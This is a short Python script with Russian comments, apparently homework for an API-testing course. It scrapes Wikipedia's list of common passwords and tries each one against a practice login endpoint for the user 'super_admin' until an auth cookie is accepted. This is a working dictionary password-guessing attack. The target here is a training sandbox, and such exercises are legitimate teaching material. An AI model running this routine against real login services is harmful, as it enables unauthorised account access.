import requests
from lxml import html


# получаем страничку
wiki = requests.get('https://en.wikipedia.org/wiki/List_of_the_most_common_passwords')

# преобразуем тело документа в дерево элементов (DOM)
parsed_body = html.fromstring(wiki.text)

# с помощью сss находим нужный блок с паролями
table_pass = parsed_body.cssselect('#mw-content-text > div.mw-parser-output > table:nth-child(10)')[0]

# выбираем элементы внутри тегов <td> выровненных по левую сторону
elements = table_pass.cssselect('td[align=left]')

# вытаскиваем текстовое значение из элементов и заносим в список row
list = []
for item in elements:
    list.append(item.text_content().strip())

# ищем среди элементов верный password и выводим его
for i in list:
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", params={"login":'super_admin',"password":i})
    cookie = response1.cookies.get("auth_cookie")
    response2 =requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={'auth_cookie':cookie})
    if response2.text == 'You are authorized':
        print(response2.text, ", your password '",i,"'")
        break
    else:
        continue